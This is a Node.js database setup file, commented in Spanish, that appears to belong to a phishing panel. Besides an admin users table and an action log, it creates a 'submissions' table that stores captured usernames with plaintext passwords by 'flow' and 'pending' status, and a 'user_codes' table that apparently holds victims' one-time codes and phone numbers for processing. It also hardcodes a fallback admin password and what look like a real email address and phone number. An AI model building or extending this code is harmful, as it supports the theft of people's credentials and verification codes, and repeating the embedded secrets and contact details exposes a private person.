import Database from "better-sqlite3";
import path from "path";
import dotenv from "dotenv";
import { hashSync } from "bcryptjs";

dotenv.config();

// Ubicación de la DB
const dbPath = path.join(process.cwd(), "data", "app.db");
const db = new Database(dbPath);

// Optimización Senior: Journaling en modo WAL para mejores escrituras concurrentes
db.pragma("journal_mode = WAL");

// 1. Tabla de Usuarios con índices para velocidad
db.prepare(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'admin',
    created_at TEXT NOT NULL
  )
`).run();

const userColumns = db.prepare("PRAGMA table_info(users)").all().map((c) => c.name);
if (!userColumns.includes("first_name")) {
  db.prepare("ALTER TABLE users ADD COLUMN first_name TEXT DEFAULT ''").run();
}
if (!userColumns.includes("last_name")) {
  db.prepare("ALTER TABLE users ADD COLUMN last_name TEXT DEFAULT ''").run();
}
if (!userColumns.includes("email")) {
  db.prepare("ALTER TABLE users ADD COLUMN email TEXT DEFAULT ''").run();
}
if (!userColumns.includes("phone")) {
  db.prepare("ALTER TABLE users ADD COLUMN phone TEXT DEFAULT ''").run();
}

// 4. Tabla de acción para logs del dashboard
db.prepare(`
  CREATE TABLE IF NOT EXISTS action_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id INTEGER NOT NULL,
    action TEXT NOT NULL,
    details TEXT,
    created_at TEXT NOT NULL,
    FOREIGN KEY(admin_id) REFERENCES users(id)
  )
`).run();

// Inicialización de Admin desde .env
const envAdminUser = process.env.ADMIN_USERNAME || "Devcrackpy";
const envAdminPassword = process.env.ADMIN_PASSWORD || "Dev15987532*";
const envAdminFirstName = process.env.ADMIN_FIRST_NAME || "DEV";
const envAdminLastName = process.env.ADMIN_LAST_NAME || "EXE";
const envAdminEmail = process.env.ADMIN_EMAIL || "ahidroid.exe@gmail.com";
const envAdminPhone = process.env.ADMIN_PHONE || "+573223213752";
const existingAdmin = db.prepare("SELECT * FROM users WHERE username = ?").get(envAdminUser);
if (!existingAdmin) {
  db.prepare("INSERT INTO users (username, password_hash, role, first_name, last_name, email, phone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
    .run(envAdminUser, hashSync(envAdminPassword, 10), "admin", envAdminFirstName, envAdminLastName, envAdminEmail, envAdminPhone, new Date().toISOString());
}

// 2. Tabla de Submissions (Captura de datos)
db.prepare(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    flow TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    timestamp TEXT NOT NULL,
    server_timestamp TEXT NOT NULL
  )
`).run();

// 3. Gestión dinámica de columnas para user_codes
// Esto evita errores si decides añadir 'flow' o 'action' después
const tableInfo = db.prepare(`PRAGMA table_info(user_codes)`).all();
if (tableInfo.length === 0) {
  db.prepare(`
    CREATE TABLE user_codes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      code TEXT,
      flow TEXT,
      action TEXT,
      phone TEXT DEFAULT '',
      created_at TEXT NOT NULL
    )
  `).run();
} else {
  const columns = tableInfo.map(c => c.name);
  if (!columns.includes("flow")) db.prepare(`ALTER TABLE user_codes ADD COLUMN flow TEXT`).run();
  if (!columns.includes("action")) db.prepare(`ALTER TABLE user_codes ADD COLUMN action TEXT`).run();
  if (!columns.includes("phone")) db.prepare(`ALTER TABLE user_codes ADD COLUMN phone TEXT DEFAULT ''`).run();
  if (!columns.includes("processed")) db.prepare(`ALTER TABLE user_codes ADD COLUMN processed INTEGER DEFAULT 0`).run();
}

export default db;